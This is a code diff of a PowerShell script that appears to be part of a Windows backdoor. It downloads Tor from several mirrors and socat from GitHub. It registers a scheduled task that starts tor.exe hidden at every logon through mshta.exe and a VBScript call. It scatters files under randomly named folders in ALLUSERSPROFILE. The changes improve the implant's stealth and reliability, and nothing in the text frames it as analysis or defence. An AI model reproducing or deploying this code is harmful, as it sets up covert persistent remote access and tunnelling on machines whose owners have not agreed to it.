@@ -4,7 +4,7 @@ $schedulerType=$SH_TYPE_SCHEDULED_TASK;
 function Unzip
 {
 param([string]$zipfile, [string]$destination);
-$7z = Join-Path $env:Temp '7za.exe';
+$7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
 if (-NOT (Test-Path $7z)){
 Try
 {
@@ -40,17 +40,17 @@ function InitScheduller{
         Import-Module ScheduledTasks -ErrorAction Stop;
         return $SH_TYPE_SCHEDULED_TASK;
     }catch{
-        $File=$env:Temp+'\ts.zip';
+        $File=$env:Temp+'\'+(RandomString)+'.zip';
         $Dest=$env:Temp+'\'+(RandomString);
+        while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
         if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
         Unzip $File $Dest;
         Remove-Item -Force $File;
-        $TSAssembly=$Dest+'\Microsoft.Win32.TaskScheduler.dll';
+        $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
         $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
         return $SH_TYPE_TASK_SCHEDULER;
     }
 }
-function xmltime ([datetime] $d){ $d.Touniversaltime().tostring("u") -replace " ","T"}
 function AddTask
 {
 param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
@@ -64,8 +64,11 @@ switch ($schedulerType) {
             $Action.WorkingDirectory=$dir;
         }
         $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
-        $LogonTrigger.StartBoundary=xmltime(Get-Date);
-        $LogonTrigger.UserId=$env:username;
+        try{
+            $LogonTrigger.UserId=$env:username;
+        }catch{
+            $LogonTrigger.User=$env:username;
+        }
         if(-Not $delay -eq 0){
             $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
         }
@@ -135,16 +138,26 @@ function Download {
 }
 function ITP{
 $schedulerType = InitScheduller;
-$tf=$env:Temp+'\t.zip';
-$DestTP=$env:APPDATA+'\'+(RandomString);
+$tf=$env:Temp+'\'+(RandomString)+'.zip';
+$DestTP=$env:ALLUSERSPROFILE+'\'+(RandomString);
+$TorMirrors=@("https://torproject.urown.net/dist/",
+"https://dist.torproject.org/",
+"https://torproject.mirror.metalgamer.eu/dist/",
+"https://tor.ybti.net/dist/");
+foreach ($mirror in $TorMirrors) {
+    $_url=$mirror+'torbrowser/7.0.6/tor-win32-0.3.1.7.zip';
+    if((Download $_url $tf)){
+        break;
+    }
+}
 if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
 Unzip $tf $DestTP;
 Remove-Item -Force $tf;
-$tor=$DestTP+'\Tor\tor.exe';
-$tor=$tor.Replace('\','/');
-$tor_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$tor`",0,False))";
-AddTask (RandomString) 'mshta.exe' $tor_cmd;
-$SFile=$env:Temp+'\s.zip';
+$tor_fold=$DestTP+'\Tor\';
+$tor_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
+AddTask (RandomString) 'mshta.exe' $tor_cmd 0 0 $tor_fold;
+$SFile=$env:Temp+'\'+(RandomString)+'.zip';
+while (!(Download 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
 Unzip $SFile $DestTP;
 $s_old=$DestTP+'\socat-windows-1.7.2.1\';
 $s_new=(RandomString);
